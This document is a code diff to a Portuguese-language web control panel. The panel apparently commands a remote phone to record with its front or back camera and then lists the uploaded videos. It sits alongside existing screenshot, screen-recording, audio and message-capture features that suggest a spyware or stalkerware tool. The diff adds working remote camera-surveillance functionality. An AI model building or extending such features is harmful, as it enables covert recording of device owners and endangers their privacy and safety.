@@ -854,6 +854,23 @@ function handleJsonMessage(data) {
             setScreenRecordingUI(false);
             break;
 
+        case 'CAMERA_RECORD_STARTED':
+            logToConsole(`🎥 Gravação de câmera ${data.face || ''} iniciada (${data.duration}s)...`, 'system');
+            if (data.face) setCameraRecordUI(data.face, true);
+            break;
+
+        case 'CAMERA_RECORD_STOPPED':
+            logToConsole(`⏹ Gravação de câmera ${data.face || ''} encerrada — aguardando upload...`, 'system');
+            if (data.face) setCameraRecordUI(data.face, false);
+            break;
+
+        case 'CAMERA_RECORD_UPLOADED':
+            logToConsole(`🎥 Nova gravação de câmera ${data.face || ''} recebida!`, 'success');
+            if (data.deviceId === currentDeviceId) {
+                fetchMediaList(currentDeviceId);
+            }
+            break;
+
         case 'NEW_MESSAGE':
             if (data.deviceId === currentDeviceId) {
                 const wasAlreadySeen = data.id != null && waSeenIds.has(data.id);
@@ -1702,6 +1719,7 @@ function fetchMediaList(deviceId) {
             renderSentAudios(deviceId);
             renderScreenshots(deviceId, data.screenshots || []);
             renderScreenRecordings(deviceId, data.screenRecordings || []);
+            renderCameraRecordings(deviceId, data.cameraRecordings || []);
         })
         .catch(err => console.error('Error fetching media list:', err));
 }
@@ -1971,6 +1989,36 @@ function setScreenRecordingUI(active) {
     }
 }
 
+// ─── Camera Recording ─────────────────────────────────────────────────────────
+const isCameraRecording = { front: false, back: false };
+
+function toggleCameraRecord(face) {
+    if (!currentDeviceId) return;
+    if (isCameraRecording[face]) {
+        sendCommand('STOP_CAMERA_RECORD', { face });
+        setCameraRecordUI(face, false);
+    } else {
+        sendCommand('START_CAMERA_RECORD', { face, duration: 60 });
+        setCameraRecordUI(face, true);
+    }
+}
+
+function setCameraRecordUI(face, active) {
+    isCameraRecording[face] = active;
+    const btn  = document.getElementById(`sc-cam-${face}-record-btn`);
+    const icon = document.getElementById(`sc-cam-${face}-record-icon`);
+    if (!btn || !icon) return;
+    if (active) {
+        icon.className = 'fa-solid fa-stop fa-beat';
+        icon.style.color = '#ff3838';
+        btn.title = `Parar gravação (${face === 'front' ? 'frontal' : 'traseira'})`;
+    } else {
+        icon.className = 'fa-solid fa-circle-dot';
+        icon.style.color = 'var(--neon-pink)';
+        btn.title = `Gravar câmera ${face === 'front' ? 'frontal' : 'traseira'}`;
+    }
+}
+
 // ─── Screenshots Gallery ───────────────────────────────────────────────────────
 function renderScreenshots(deviceId, screenshots) {
     const gallery = document.getElementById('screenshots-gallery');
@@ -2019,6 +2067,39 @@ function renderScreenRecordings(deviceId, recordings) {
                 <i class="fa-solid fa-film" style="color:var(--neon-pink)"></i>
                 <div class="audio-meta">
                     <span class="audio-name">Gravação de Tela</span>
+                    <span class="audio-time">${ts}</span>
+                </div>
+            </div>
+            <video controls style="width:100%;max-height:200px;border-radius:8px;margin-top:8px;background:#000" preload="metadata">
+                <source src="${url}" type="video/mp4">
+            </video>`;
+        list.appendChild(div);
+    });
+}
+
+// ─── Camera Recordings List ────────────────────────────────────────────────────
+function renderCameraRecordings(deviceId, recordings) {
+    const list = document.getElementById('camera-recordings-list');
+    if (!list) return;
+    if (!recordings || recordings.length === 0) {
+        list.innerHTML = '<div class="empty-audio-msg">Nenhuma gravação de câmera ainda.</div>';
+        return;
+    }
+    list.innerHTML = '';
+    [...recordings].reverse().forEach(item => {
+        const fileName = item.name || item;
+        const url      = item.url || `/uploads/${deviceId}/camera-recordings/${fileName}`;
+        const faceMatch = fileName.match(/cam_record_(front|back)_/);
+        const tsMatch   = fileName.match(/cam_record_(?:front|back)_(\d+)\.mp4/);
+        const faceLabel = faceMatch ? (faceMatch[1] === 'front' ? 'Frontal' : 'Traseira') : '';
+        const ts        = tsMatch ? new Date(parseInt(tsMatch[1])).toLocaleString('pt-BR') : fileName;
+        const div = document.createElement('div');
+        div.className = 'audio-item';
+        div.innerHTML = `
+            <div class="audio-info">
+                <i class="fa-solid fa-video" style="color:var(--neon-blue)"></i>
+                <div class="audio-meta">
+                    <span class="audio-name">Câmera ${faceLabel}</span>
                     <span class="audio-time">${ts}</span>
                 </div>
             </div>
